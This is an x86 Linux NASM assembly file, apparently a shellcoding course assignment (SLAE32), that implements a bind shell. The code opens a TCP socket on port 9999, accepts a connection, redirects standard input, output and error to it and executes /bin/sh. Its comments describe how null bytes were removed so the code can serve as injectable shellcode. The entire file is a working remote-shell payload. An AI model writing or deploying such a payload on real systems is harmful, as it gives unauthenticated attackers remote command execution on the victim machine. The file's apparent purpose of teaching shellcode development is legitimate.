; Bind_Shell.nasm 
; Author: Ian McLachlan

; SLAE32 - Assignment 1 Bind Shell


global _start

section .text

_start:

	; SOCKET SECTION ********************************************* CLEAN NULL BYTES

	xor eax, eax    	; clean registers
        xor ebx, ebx
	xor ecx, ecx		; ADDED TO FIX NULL BYTES (DIDN'T EXIST)

	mov al, 0x66       	; Syscall SocketCall
        mov bl, 0x1		; SOCKET (1)

        push ecx		; PROTOCOL (0) CHANGED TO FIX NULL BYTES - WAS (PUSH 0x0)
        push 0x1		; SOCKET_STREAM (1)
	push 0x2		; AF_INET (2)  

        mov ecx, esp 		;  puts 2,1,0 into ecx

	int 0x80		; call interrupt

	; BIND SECTION ************************************************
	
	mov esi, eax            ; move return value from socket in edx
        xor eax, eax            ; clean eax
	xor edx, edx

	mov al, 0x66       	; Syscall SocketCall
        inc bl			; BIND (2)

	push edx		; INADDR_ANY (0)
	push word 0x0f27        ; port 9999  (9999d=270fh)  
	push word 0x2		; AF_INET (2)
	mov ecx, esp		; Builds struct

	push byte 0x10		; (16d=10h) port size
	push ecx		; push struct
	push esi		; sockfd
	
        mov ecx, esp		; move ecx to start of stack  
	
	int 0x80		; call interrupt

	; LISTEN SECTION ************************************************
	
	xor edx, edx		; ADDED TO FIX NULL BYTES (DIDN'T EXIST)	
	mov al, 0x66      	; Syscall LISTEN
        mov bl, 0x4		; LISTEN (4)

	;mov dl, 0x0		; backlog 0 CHANGED TO FIX NULL BYTES - WAS (mov edx, 0x0)
	
	int 0x80		; call interrupt

	; ACCEPT SECTION ************************************************
	
	xor ecx, ecx	
	mov al, 0x66       	; Syscall SocketCall
        inc bl			; ACCEPT (5)
        push edx		; 0
	push edx		; 0
	push esi		; sockfd (3 returned)
	
	mov ecx, esp		; move ecx to start of stack 

	int 0x80		; call interrupt

	; FILE_DESCRIPTOR SECTION ************************************************

	
	xchg ebx, eax		; fdclient need for redirction
	xor ecx, ecx
	mov esi, eax

	mov al, 0x3f       	; Syscall Dup2 (63d=3fh)
        mov cl, 0x2		; stderr
	int 0x80		; call interrupt

        mov al, 0x3f       	; Syscall Dup2 (63d=3fh)
        mov cl, 0x1		; stdout
	int 0x80		; call interrupt

	xor ecx, ecx		; ADDED TO FIX NULL BYTES (DIDN'T EXIST)
	mov al, 0x3f       	; Syscall Dup2 (63d=3fh)
        ;mov cl, 0x0		; stdin
	int 0x80		; call interrupt

	; EXECUTE SHELL SECTION ************************************************
	
	xor eax, eax

	push eax		; First set Null
	push 0x68732f2f		; //bin/sh  (in reverse little edian)
	push 0x6e69622f

	mov ebx, esp		; move ecx to start of stack
	
	mov al, 0xb
	int 0x80

section .data


	
